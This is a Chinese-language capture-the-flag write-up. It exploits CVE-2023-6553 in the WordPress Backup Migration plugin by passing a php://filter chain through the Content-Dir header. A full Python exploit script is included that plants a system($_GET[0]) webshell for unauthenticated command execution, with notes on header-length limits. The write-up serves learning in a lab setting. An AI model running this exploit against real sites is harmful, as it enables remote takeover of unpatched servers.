## 题解

### 入口与指纹

WordPress **6.5.4**（Apache 2.4.67，站点标题就叫 `RCE`）。插件枚举命中：

```text
/wp-content/plugins/backup-backup/readme.txt   → Stable tag: 1.3.5
```

即 **Backup Migration ≤ 1.3.7 = CVE-2023-6553**，入口是
`/wp-content/plugins/backup-backup/includes/backup-heart.php`。

### 关键观察

**1. 漏洞点在 `Content-Dir` 请求头。**

`backup-heart.php` 只校验 `POST`，然后把请求头转成常量后执行：

```php
define('BMI_ROOT_DIR', $fields['content-dir']);          // 来自请求头 Content-Dir
define('BMI_INCLUDES', BMI_ROOT_DIR . 'includes');
...
require_once BMI_INCLUDES . '/bypasser.php';
```

所以 `Content-Dir` 可以是任意 stream wrapper → 任意 PHP 执行。

**2. 需要 php://filter 链，而且要在 POST 里带命令。**

`data://` 需要 `allow_url_include=On`（本机为 Off），`php_filter_chain` 走的是
`php://filter/convert.iconv.../resource=php://temp`，只依赖 iconv 与 base64 过滤器，
不受 `allow_url_include` 限制。

**3. 头长度上限 ~8190 字节，所以 PHP 代码要短。**

链长度约 **180 字节/字符**，因此把代码缩到
`<?=system($_GET[0]);?>`（20 字符，链 4500 字节），命令用 query 传：

```text
POST /wp-content/plugins/backup-backup/includes/backup-heart.php?0=<cmd>
Content-Dir: php://filter/<chain>/resource=php://temp
```

`$_GET` 在 `require_once` 时是可用的，命令输出直接进响应体（后面跟一段 iconv 尾巴，忽略即可）。

### 利用链

```bash
T=$(head -1 .target)          # IP
python3 - "$T" <<'PY'
import sys, requests
from php_filter_chain import PHPFilterChainGenerator   # synacktiv 的生成器
T = f"http://{sys.argv[1]}"
chain = PHPFilterChainGenerator().generate_filter_chain("<?=system($_GET[0]);?>")
def rce(cmd):
    r = requests.post(
        f"{T}/wp-content/plugins/backup-backup/includes/backup-heart.php",
        params={"0": cmd}, headers={"Content-Dir": chain}, data={}, timeout=40)
    return r.content
print(rce("ls -la /opt").decode("utf8", "replace"))
print(rce("cat /opt/flag.txt").decode("utf8", "replace"))
PY
```

### flag 位置

容器内 **`/opt/flag.txt`**（`/flag`、`/flag.txt`、`/challenge/flag.txt` 都不存在）。
执行身份 `www-data`。

## 复盘

- **插件版本 = 漏洞。** `readme.txt` 的 `Stable tag` 直接给出可用 CVE，先查这一行再谈黑盒。
- **`Content-Dir`/`Content-*` 这类「请求头进常量再 include」是典型的未授权 RCE。**
  只要能看到 `require_once <header>. '/xxx.php'` 就够了。
- **判断 filter chain 是否真的执行，用 `<?php echo "MARKER";?>` 做定性测试。**
  只要响应体里出现 MARKER，就说明 include 成功；后面的一堆二进制是 iconv 尾巴，不是失败。
  这一步省掉了「写文件失败就以为链无效」的误判（我先前正是这么误判的）。
- **头长度是硬约束。** 用 `$_GET[0]` / `$_POST[0]` 把命令外置，payload 才能塞进 8KB。
- 之前用 `<?=copy('/flag.txt','q');?>` 失败，是因为路径猜错（flag 在 `/opt`），不是链的问题。
